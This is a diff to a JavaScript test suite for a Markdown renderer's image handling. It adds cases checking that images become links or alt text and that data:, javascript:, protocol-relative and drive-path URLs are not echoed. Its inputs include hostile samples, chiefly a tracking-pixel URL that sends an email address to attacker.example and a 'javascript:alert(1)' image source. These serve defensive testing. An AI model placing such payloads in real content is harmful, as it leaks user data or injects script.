@@ -166,8 +166,12 @@ test("a Markdown image never renders an <img>; it becomes a link the user can cl
       "![](https://attacker.example/p.png?d=alice%40corp.com)",
       "![Quarterly chart](https://attacker.example/chart.png)",
       "![   ](https://attacker.example/blank.png)",
+      '![titled](https://attacker.example/titled.png "Chart title")',
+      "![upper](HTTPS://attacker.example/upper.png)",
+      "![plain](http://attacker.example/plain.png)",
       "![reference][pixel]",
       "[![badge](https://attacker.example/badge.svg)](https://github.com/openwhispr)",
+      "[![](https://attacker.example/blank-badge.svg)](https://github.com/openwhispr/blank)",
       "",
       "[pixel]: https://attacker.example/ref.png",
       "",
@@ -197,11 +201,20 @@ test("a Markdown image never renders an <img>; it becomes a link the user can cl
       ],
       ["https://attacker.example/chart.png", "Quarterly chart"],
       ["https://attacker.example/blank.png", "https://attacker.example/blank.png"],
+      ["https://attacker.example/titled.png", "titled"],
+      ["HTTPS://attacker.example/upper.png", "upper"],
+      ["http://attacker.example/plain.png", "plain"],
       ["https://attacker.example/ref.png", "reference"],
       // A nested link would take the click, so the surrounding link keeps it.
       ["https://github.com/openwhispr", "badge"],
+      // The image URL would read as the destination of a link that goes elsewhere.
+      ["https://github.com/openwhispr/blank", ""],
     ],
     "each image is a link labelled with its alt text, or its URL when the alt text is blank"
+  );
+  assert.ok(
+    links.find(({ label }) => label === "titled").attrs.includes('title="Chart title"'),
+    "the image title carries over"
   );
   for (const { attrs } of links) {
     assert.ok(attrs.includes('target="_blank"'), "opens like other Markdown links");
@@ -215,9 +228,11 @@ test("an image without an absolute web URL keeps only its alt text", async (t) =
     [
       "![inline chart](data:image/png;base64,iVBORw0KGgo=)",
       "![](javascript:alert(1))",
-      "![share](//attacker.example/unc.png)",
+      "![share](//attacker.example/unc.png?next=https://attacker.example/)",
       "![drive](/C:/Windows/System32/cmd.exe)",
       "![anchor](#section)",
+      "![](//attacker.example/blank-share.png)",
+      "![](/C:/Windows/System32/blank.exe)",
       "",
     ].join("\n")
   );
@@ -230,6 +245,7 @@ test("an image without an absolute web URL keeps only its alt text", async (t) =
   assert.ok(!html.includes("data:"), "the data: URL is not echoed");
   assert.ok(!html.includes("javascript:"), "the javascript: URL is not echoed");
   assert.ok(!html.includes("attacker.example"), "the relative URL is not echoed");
+  assert.ok(!html.includes("System32"), "the drive path is not echoed");
 });
 
 test("URL sanitisation is unchanged with the plugin enabled", async (t) => {
